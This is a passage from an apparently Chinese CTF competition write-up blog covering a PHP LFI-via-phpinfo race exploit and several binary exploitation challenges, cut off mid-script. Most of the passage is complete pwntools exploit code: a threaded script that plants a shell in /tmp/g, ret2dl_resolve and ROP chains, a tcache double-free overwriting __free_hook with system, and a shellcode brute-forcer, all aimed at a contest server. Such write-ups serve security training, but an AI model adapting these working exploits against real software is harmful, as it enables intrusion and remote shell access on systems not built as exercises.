class="line">%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    #modify this to suit the LFI script   </span><br><span class="line">    LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span><br><span class="line">User-Agent: Mozilla/4.0\r</span><br><span class="line">Proxy-Connection: Keep-Alive\r</span><br><span class="line">Host: %s\r</span><br><span class="line">\r</span><br><span class="line">\r</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    return (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = &quot;&quot;</span><br><span class="line">    while len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    try:</span><br><span class="line">        i = d.index(&quot;[tmp_name] =&amp;gt; &quot;)</span><br><span class="line">        fn = d[i+17:i+31]</span><br><span class="line">    except ValueError:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(4096)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    if d.find(tag) != -1:</span><br><span class="line">        return fn</span><br><span class="line"></span><br><span class="line">counter=0</span><br><span class="line">class ThreadWorker(threading.Thread):</span><br><span class="line">    def __init__(self, e, l, m, *args):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        global counter</span><br><span class="line">        while not self.event.is_set():</span><br><span class="line">            with self.lock:</span><br><span class="line">                if counter &gt;= self.maxattempts:</span><br><span class="line">                    return</span><br><span class="line">                counter+=1</span><br><span class="line"></span><br><span class="line">            try:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                if self.event.is_set():</span><br><span class="line">                    break                </span><br><span class="line">                if x:</span><br><span class="line">                    print &quot;\nGot it! Shell created in /tmp/g&quot;</span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            except socket.error:</span><br><span class="line">                return</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def getOffset(host, port, phpinforeq):</span><br><span class="line">    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = &quot;&quot;</span><br><span class="line">    while True:</span><br><span class="line">        i = s.recv(4096)</span><br><span class="line">        d+=i        </span><br><span class="line">        if i == &quot;&quot;:</span><br><span class="line">            break</span><br><span class="line">        # detect the final chunk</span><br><span class="line">        if i.endswith(&quot;0\r\n\r\n&quot;):</span><br><span class="line">            break</span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)</span><br><span class="line">    if i == -1:</span><br><span class="line">        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)</span><br><span class="line">    </span><br><span class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</span><br><span class="line">    # padded up a bit</span><br><span class="line">    return i+256</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    print &quot;LFI With PHPInfo()&quot;</span><br><span class="line">    print &quot;-=&quot; * 30</span><br><span class="line"></span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[1])</span><br><span class="line">    except socket.error, e:</span><br><span class="line">        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    port=80</span><br><span class="line">    try:</span><br><span class="line">        port = int(sys.argv[2])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    </span><br><span class="line">    poolsz=10</span><br><span class="line">    try:</span><br><span class="line">        poolsz = int(sys.argv[3])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    print &quot;Getting initial offset...&quot;,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = 1000</span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    print &quot;Spawning worker pool (%d)...&quot; % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    for i in range(0,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    for t in tp:</span><br><span class="line">        t.start()</span><br><span class="line">    try:</span><br><span class="line">        while not e.wait(1):</span><br><span class="line">            if e.is_set():</span><br><span class="line">                break</span><br><span class="line">            with l:</span><br><span class="line">                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                if counter &gt;= maxattempts:</span><br><span class="line">                    break</span><br><span class="line">        print</span><br><span class="line">        if e.is_set():</span><br><span class="line">            print &quot;Woot!  \m/&quot;</span><br><span class="line">        else:</span><br><span class="line">            print &quot;:(&quot;</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        print &quot;\nTelling threads to shutdown...&quot;</span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    print &quot;Shuttin&apos; down...&quot;</span><br><span class="line">    for t in tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/15.png" alt="15"></p>
<p>运行脚本</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/16.png" alt="16"></p>
<p>（表示后来没有上传成功，但似乎有大佬先上传成功了，所以后面的步骤我也能继续做）</p>
<p>先验证是否上传成功</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/70.png" alt="70"></p>
<p>嗯，的确有大佬上传成功了，连文件名也一样，好的，谢谢了。getsheell</p>
<p>于是<img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/36.png" alt="36"></p>
<p>flag应该在那个奇怪名字的文件里吧</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/28.png" alt="28"></p>
<p>果然，</p>
<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/89.png" alt="89"></p>
<p>拿到flag</p>
<p>这题的关键还是上传有大量垃圾数据的恶意文件吧。（所以哪位大佬上传成功了）</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="hardpwn"><a href="#hardpwn" class="headerlink" title="hardpwn"></a>hardpwn</h3><p>导入IDA后，发现需要覆盖运行参数（即argv），因为栈溢出很长且可以覆盖到该参数，所以可以考虑直接覆盖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">elf = ELF(&quot;pwn1&quot;)</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process(&quot;./pwn1&quot;)</span><br><span class="line">	else:	</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	payload = &apos;\x00&apos; * 120 +&quot;aaaa&quot; + &quot;\x00&quot;</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;47.110.227.208&quot;,10001,0)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/59.png" alt="59"></p>
<h3 id="stackpwn"><a href="#stackpwn" class="headerlink" title="stackpwn"></a>stackpwn</h3><p>导入IDA后，发现没有puts、write等，只有read且有溢出，那么这道题就是典型的考察ret2_dl_resolve，用ctf-wiki的脚本改一下就可以拿到shell了</p>
<p>利用roputils简化攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">from pwn import remote</span><br><span class="line">#r = process(&apos;./pwn3&apos;)</span><br><span class="line">r = remote(&quot;47.110.227.208&quot;,10003)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">rop = ROP(&apos;./pwn3&apos;)</span><br><span class="line">offset = 60</span><br><span class="line">bss_base = 0x804a000 + 0x800</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line">buf += rop.call(&apos;read&apos;, 0, bss_base, 100)</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line">buf = rop.string(&apos;/bin/sh&apos;)</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/35.png" alt="35"></p>
<h3 id="floatpwn"><a href="#floatpwn" class="headerlink" title="floatpwn"></a>floatpwn</h3><p>这题考察了确定浮点寄存器通过movss写入内存时的数值</p>
<p>方法：只能人工二分法一次一次去尝试，然后发现小数点后45位之前可以忽略不计，真正开始有意义的数值在小数点后45位开始。然后求出对应的n使得写回内存时是我想要的数值，从而构造ROP链。但是想构造ROP链之前需要实现无限写，所以输入size时，可以考虑输入负数，实现无符号整数溢出，从而无限写。因为控制写入数据位置的i变量位于栈空间底部，所以要使得写到i里的数据为10到12即可，因为可以考虑直接略过ebp，直接修改rip。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">elf = ELF(&quot;pwn2&quot;)</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def inputFloat(num):</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.send(num)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline()</span><br><span class="line">def inputRop(num):</span><br><span class="line">	num = str(num)</span><br><span class="line">	num = num.rjust(45,&quot;0&quot;)</span><br><span class="line">	num = num.ljust(0x62,&quot;0&quot;)</span><br><span class="line">	inputFloat(&quot;0.&quot; + num)</span><br><span class="line">	inputFloat(&quot;0&quot;)	</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process(&quot;./pwn2&quot;)</span><br><span class="line">		lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF(&quot;libc6_2.27-3ubuntu1_amd64.so&quot;)</span><br><span class="line">	#puts 5879714 0x400640</span><br><span class="line">	#pop_rdi 5881041 0x4009f3</span><br><span class="line">	#__libc_start_main_got 8822026 0x601038</span><br><span class="line">	#main 5880847 0x400969</span><br><span class="line">	#start 5879938 0x4006E0</span><br><span class="line">	#call vul 5880867 0x400977</span><br><span class="line">	#vul 5880653 0x4008DE</span><br><span class="line">	#read 5879781 0x400670</span><br><span class="line">	#pop_rsi_r15_ret 5881038 0x4009f1</span><br><span class="line">	#read_got 8822014 0x601030</span><br><span class="line">	#binsh 8822106 0x601071</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(&quot;-1.9999&quot;)</span><br><span class="line">	for i in range(0,13):</span><br><span class="line">		inputFloat(&quot;111&quot;)</span><br><span class="line">	inputFloat(&quot;13&quot;)</span><br><span class="line">	inputFloat(&quot;13&quot;)</span><br><span class="line">	inputFloat(&quot;0.&quot; + &quot;0&quot; * 43 + &quot;23&quot;)#0x11</span><br><span class="line">	inputFloat(&quot;0.&quot; + &quot;0&quot; * 43 + &quot;23&quot;)#fake</span><br><span class="line"></span><br><span class="line">	#rip = 0x4009f3</span><br><span class="line">	#pop_rdi_ret</span><br><span class="line">	inputRop(5881041)</span><br><span class="line"></span><br><span class="line">	#__libc_start_main got</span><br><span class="line">	inputRop(8822026)</span><br><span class="line"></span><br><span class="line">	#puts_plt</span><br><span class="line">	inputRop(5879714)</span><br><span class="line">	</span><br><span class="line">	#pop_rdi_ret</span><br><span class="line">	inputRop(5881041)</span><br><span class="line">	inputRop(0)</span><br><span class="line"></span><br><span class="line">	#pop_rsi_r15_ret</span><br><span class="line">	inputRop(5881038)</span><br><span class="line">	inputRop(8822106)</span><br><span class="line">	inputRop(0)</span><br><span class="line"></span><br><span class="line">	#read_plt</span><br><span class="line">	inputRop(5879781)</span><br><span class="line"></span><br><span class="line">	#pop_rdi_ret</span><br><span class="line">	inputRop(5881041)</span><br><span class="line">	inputRop(0)</span><br><span class="line"></span><br><span class="line">	#pop_rsi_r15_ret</span><br><span class="line">	inputRop(5881038)</span><br><span class="line">	inputRop(8822014)</span><br><span class="line">	inputRop(0)</span><br><span class="line"></span><br><span class="line">	#read_plt</span><br><span class="line">	inputRop(5879781)</span><br><span class="line"></span><br><span class="line">	#pop_rdi_ret</span><br><span class="line">	inputRop(5881041)</span><br><span class="line">	inputRop(8822106)</span><br><span class="line"></span><br><span class="line">	#read_plt</span><br><span class="line">	inputRop(5879781)</span><br><span class="line"></span><br><span class="line">	#input()</span><br><span class="line">	sh.recvuntil(&quot;plz input your float:&quot;)</span><br><span class="line">	sh.sendline(&quot;0&quot;)</span><br><span class="line">	sh.recvuntil(&quot;do you want to continue?(y/n)&quot;)</span><br><span class="line">	sh.send(&quot;n&quot;)</span><br><span class="line"></span><br><span class="line">	__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))</span><br><span class="line">	libc = __libc_start_main - lib.symbols[&apos;__libc_start_main&apos;]</span><br><span class="line">	system = libc + lib.symbols[&apos;system&apos;]</span><br><span class="line">	binsh = libc + lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">	sh.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(p64(system))</span><br><span class="line">	log.success(&quot;__libc_start_main: &quot; + hex(__libc_start_main))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;47.110.227.208&quot;,10002,0)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/71.png" alt="71"></p>
<h3 id="Babytcache"><a href="#Babytcache" class="headerlink" title="Babytcache"></a>Babytcache</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec 可以看到程序没有开PIE,同时bss中存放了_IO_2_1_stdout_的地址,并且libc2.27有double free,所以思路就很明确了.有了double free就可以malloc 2 everywhere,所以这样一的难点在于如何leak libc,通过double free,可以让fd指向_IO_2_1_stdout_,从而malloc 2 _IO_2_1_stdout_,从而修改write_base来leak libc,之后再double free去修改free_hook为system,去free一个/bin/sh就可以了</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">sh=remote(&quot;47.110.227.208&quot;,10006)</span><br><span class="line"></span><br><span class="line"># CyCTF&#123;Tc4ch3_Att4ck_Is_S1mpl3_R1ght?&#125;</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;input your size:&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;input your message:&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(&apos;Done!\n&apos;)</span><br><span class="line"></span><br><span class="line">def add2(size,content):</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;input your size:&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;input your message:&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    #sh.recvuntil(&apos;Done!\n&apos;)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;input the index: &apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    add(0x100,&apos;a\n&apos;)</span><br><span class="line">    add(0x100,&apos;a\n&apos;)</span><br><span class="line">    add(0x100,&apos;a\n&apos;)</span><br><span class="line">    delete(0)</span><br><span class="line">    delete(0)</span><br><span class="line">    add(0x100,p64(0x0000000000602020)+&apos;\n&apos;)</span><br><span class="line">    add(0x100,p64(0x0000000000602020)+&apos;\n&apos;)</span><br><span class="line">    add(0x100,&apos;\n&apos;)</span><br><span class="line">    </span><br><span class="line">    add2(0x100,p64(0xfbad1880)+p64(0x0)*3+&apos;\x20\n&apos;)</span><br><span class="line">    libc_base=u64(sh.recv(6)+&apos;\x00\x00&apos;)-0x3eb780</span><br><span class="line">    print &quot;libc_base -&gt; &quot; + hex(libc_base)</span><br><span class="line">    free_hook=libc_base+libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line">    system=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">    sh.recvuntil(&apos;Done!\n&apos;)</span><br><span class="line">    </span><br><span class="line">    add(0x10,&apos;/bin/sh\x00\n&apos;) # index 7</span><br><span class="line">    add(0x20,&apos;\n&apos;) # index 8</span><br><span class="line">    delete(8)</span><br><span class="line">    delete(8)</span><br><span class="line">    add(0x20,p64(free_hook)+&apos;\n&apos;)</span><br><span class="line">    add(0x20,p64(free_hook)+&apos;\n&apos;)</span><br><span class="line">    add(0x20,p64(system)+&apos;\n&apos;)</span><br><span class="line">    delete(7)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/90.png" alt="90"></p>
<h3 id="codepwn"><a href="#codepwn" class="headerlink" title="codepwn"></a>codepwn</h3><p>通过逆向可以发现程序将flag存入了内存中,并且我们可以选择flag对应的下标进行对比,可是4字节的shellcode有着限制,并且v5是call shellcode之后的返回值,那么就必须在shellcode中对rax进行赋值操作,可以观察到r9寄存器的大小是跟printf出来的字节数相关,那么就可以通过push r9,pop rax,ret,三个操作来对rax赋值,进而根据程序最后的判断来确认我们猜测的flag对应下标的那个字母是否正确,接下来就是爆破就完事了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;CRITICAL&apos;</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def flag_index(index):</span><br><span class="line"></span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def code(code):</span><br><span class="line"></span><br><span class="line">    sh.send(code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def name(size,content):</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(&apos;tell me your name size:\n&apos;)</span><br><span class="line"></span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(&apos;input your name:\n&apos;)</span><br><span class="line"></span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=open(&apos;./pwn4_flag&apos;,&apos;a+&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line"></span><br><span class="line">    for index in range(32):</span><br><span class="line"></span><br><span class="line">        for i in range(0x1,0x7f):</span><br><span class="line"></span><br><span class="line">            sh=remote(&apos;47.110.227.208&apos;,10004)</span><br><span class="line"></span><br><span class="line">            #sh=process(&apos;./pwn4&apos;)</span><br><span class="line"></span><br><span class="line">            sh.recvuntil(&apos;this is my gift for you, take it!\n&apos;)</span><br><span class="line"></span><br><span class="line">            flag_index(index)</span><br><span class="line"></span><br><span class="line">            sh.recvuntil(&apos;input your code:\n&apos;)</span><br><span class="line"></span><br><span class="line">            code(&apos;AQX\xC3&apos;)</span><br><span class="line"></span><br><span class="line">            padding=&apos;a&apos;.ljust(i,&apos;a&apos;)</span><br><span class="line"></span><br><span class="line">            name(0x100,padding)</span><br><span class="line"></span><br><span class="line">            sh.recvuntil(&apos;Hello are you ready? &apos;+padding+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">            sh.sendline()</span><br><span class="line"></span><br><span class="line">            info = sh.recv()</span><br><span class="line"></span><br><span class="line">            if((info).find(&apos;bye!&apos;) != -1):</span><br><span class="line"></span><br><span class="line">                print  chr(i+0x16)</span><br><span class="line"></span><br><span class="line">                flag.write(chr(i+0x16))</span><br><span class="line"></span><br><span class="line">                sh.close()</span><br><span 